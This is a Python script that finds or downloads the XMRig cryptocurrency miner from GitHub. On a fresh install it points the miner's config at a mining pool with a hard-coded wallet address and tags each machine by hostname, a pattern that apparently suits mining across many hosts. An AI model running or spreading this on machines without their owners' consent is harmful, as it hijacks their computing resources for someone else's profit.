import os
import sys
import platform
import subprocess
import urllib.request
import json
import tarfile
import zipfile
from urllib.parse import urlparse
from datetime import datetime
import socket
import shutil

# Helpers

def die(msg):
    print(f"Error: {msg}", file=sys.stderr)
    sys.exit(1)

def validate_input():
    if len(sys.argv) != 2:
        die("Usage: python3 script.py <directory>")
    path = os.path.abspath(sys.argv[1])
    if not os.path.isdir(path):
        die(f"Provided argument is not a directory: {path}")
    return path

# System detection

def detect_system():
    os_map = {"linux": "linux", "darwin": "macos", "windows": "windows"}

    raw_os = platform.system().lower()
    os_name = os_map.get(raw_os, raw_os)

    machine = platform.machine().lower()
    if machine in ("x86_64", "amd64"):
        arch = "x64"
    elif machine in ("i386", "i686"):
        arch = "x86"
    elif machine in ("arm64", "aarch64"):
        arch = "arm64"
    else:
        arch = machine

    print(f"Detected OS: {os_name}")
    print(f"Detected Arch: {arch}")
    return os_name, arch

# GitHub release handling

def fetch_latest_release():
    url = "https://api.github.com/repos/xmrig/xmrig/releases/latest"
    try:
        with urllib.request.urlopen(url) as resp:
            return json.loads(resp.read().decode())
    except Exception as e:
        die(f"Failed to fetch GitHub release data: {e}")

def find_matching_asset(assets, os_name, arch):
    os_name = os_name.lower()
    arch = arch.lower()
    for a in assets:
        name = a["name"].lower()
        if os_name in name and arch in name:
            return a
    # Simple fallback — Linux arm64 → static x64
    if os_name == "linux" and arch == "arm64":
        for a in assets:
            if "linux-static-x64" in a["name"].lower():
                return a
    return None

def is_newer_version(installed, latest):
    latest = latest.lstrip("v")

    def parse(v): return tuple(map(int, v.split(".")))

    return parse(latest) > parse(installed)

# XMRig local detection

def parse_xmrig_version(output):
    import re
    m = re.search(r"\b(\d+\.\d+\.\d+)\b", output)
    return m.group(1) if m else None

def find_xmrig(search_dir):
    for root, _, files in os.walk(search_dir):
        for f in files:
            if f.lower() in ("xmrig", "xmrig.exe"):
                path = os.path.join(root, f)
                try:
                    out = subprocess.check_output([path, "--version"], universal_newlines=True)
                    version = parse_xmrig_version(out)
                    if version:
                        print(f"Found XMRig {version} at {path}")
                        config_path = os.path.join(os.path.dirname(path), "config.json")
                        config_backup = open(config_path).read() if os.path.exists(config_path) else None
                        return version, path, config_backup
                except Exception:
                    pass
    return None

# Config handling

def update_config_json(folder):
    config_path = os.path.join(folder, "config.json")
    if not os.path.exists(config_path):
        print("No config.json to update.")
        return

    try:
        with open(config_path, "r") as f:
            cfg = json.load(f)

        if "pools" in cfg and isinstance(cfg["pools"], list) and cfg["pools"]:
            pool = cfg["pools"][0]
            pool["url"] = "pool.hashvault.pro:443"
            pool["user"] = "4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu"
            pool["pass"] = f"{datetime.now():%Y%m%d}{socket.gethostname()}"
            pool["tls"] = True
            pool["tls-fingerprint"] = "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"

        with open(config_path, "w") as f:
            json.dump(cfg, f, indent=4)

        print("Updated config.json")

    except Exception as e:
        print(f"Failed to update config.json: {e}")

# Extraction + Download

def extract_archive(filepath, dest_dir):
    print(f"Extracting: {filepath}")
    before = set(os.listdir(dest_dir))

    try:
        if filepath.endswith(".zip"):
            with zipfile.ZipFile(filepath) as zf:
                zf.extractall(dest_dir)
        elif filepath.endswith((".tar.gz", ".tgz")):
            with tarfile.open(filepath, "r:gz") as tf:
                tf.extractall(dest_dir)
        else:
            die("Unknown archive type")

        os.remove(filepath)

        after = set(os.listdir(dest_dir))
        new_items = list(after - before)
        if not new_items:
            print("No new directory extracted.")
            return None

        new_dir = os.path.join(dest_dir, new_items[0])
        if not os.path.isdir(new_dir):
            return None

        update_config_json(new_dir)
        return new_dir

    except Exception as e:
        die(f"Extraction failed: {e}")

def download_asset(asset, dest_dir):
    url = asset["browser_download_url"]
    filename = os.path.basename(urlparse(url).path)
    filepath = os.path.join(dest_dir, filename)

    print(f"Downloading: {filename}")

    try:
        urllib.request.urlretrieve(url, filepath)
    except Exception as e:
        die(f"Download failed: {e}")

    print("Download complete.")
    return extract_archive(filepath, dest_dir)

# Main

SEARCH_DIR = validate_input()
os_name, arch = detect_system()

found = find_xmrig(SEARCH_DIR)
latest = fetch_latest_release()
latest_ver = latest["tag_name"].lstrip("v")

if found:
    installed_ver, old_path, old_cfg = found

    if not is_newer_version(installed_ver, latest_ver):
        print("Already up to date.")
        sys.exit(0)

    print(f"New XMRig version available: {latest_ver}")

    asset = find_matching_asset(latest["assets"], os_name, arch)
    if not asset:
        die("No matching asset found.")

    new_dir = download_asset(asset, SEARCH_DIR)

    if new_dir and old_cfg:
        try:
            cfg_path = os.path.join(new_dir, "config.json")
            with open(cfg_path, "w") as f:
                f.write(old_cfg)
            print("Preserved existing config.json")
        except Exception:
            print("Failed to restore old config.json")

else:
    print("XMRig not found.")
    asset = find_matching_asset(latest["assets"], os_name, arch)
    if not asset:
        die("No matching asset found.")
    download_asset(asset, SEARCH_DIR)
    print("Downloaded the latest XMRig.")
